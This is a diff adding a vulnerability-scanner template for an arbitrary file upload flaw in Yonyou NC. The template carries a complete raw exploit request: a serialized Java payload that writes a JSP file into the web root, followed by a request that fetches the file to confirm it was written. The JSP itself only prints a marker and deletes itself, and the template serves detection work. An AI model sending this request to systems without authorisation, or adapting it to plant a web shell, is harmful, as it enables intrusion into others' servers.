@@ -1,0 +1,44 @@
+id: yonyou-nc-arbitrary-file-upload
+info:
+  name: Yonyou NC Arbitrary File Upload Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: file-upload
+  description: |
+    This template detects arbitrary file upload vulnerability in Yonyou NC allowing attackers to upload malicious files.
+http:
+  - raw:
+      - |
+        POST /servlet/FileReceiveServlet HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: multipart/form-data;
+
+        \xac\xed\x00\x05sr\x00\x11java.util.HashMap\x05\x07\xda\xc1\xc3\x16`\xd1\x03\x00\x02F\x00\nloadFactorI\x00\tthresholdxp?@\x00\x00\x00\x00\x00\fw\b\x00\x00\x00\x10\x00\x00\x00\x02t\x00\tFILE_NAMEt\x00\t{{random_file_name}}.jspt\x00\x10TARGET_FILE_PATHt\x00\x10./webapps/nc_webx<%out.print("{{random_int}}poc123");new java.io.File(application.getRealPath(request.getServletPath())).delete();%>
+    extractors:
+      - type: regex
+        name: uploaded_file
+        part: body
+        regex:
+          - "{{random_file_name}}.jsp"
+        internal: true
+    matchers:
+      - type: status
+        status:
+          - 200
+
+  - raw:
+      - |
+        GET /{{uploaded_file}} HTTP/1.1
+        Host: {{Hostname}}
+    matchers:
+      - type: word
+        words:
+          - "{{random_int}}poc123"
+        part: body
+      - type: status
+        status:
+          - 200
+    matchers-condition: and
+variables:
+  random_file_name: "{{rand_int(10000, 20000)}}"
+  random_int: "{{rand_int(100000, 200000)}}"
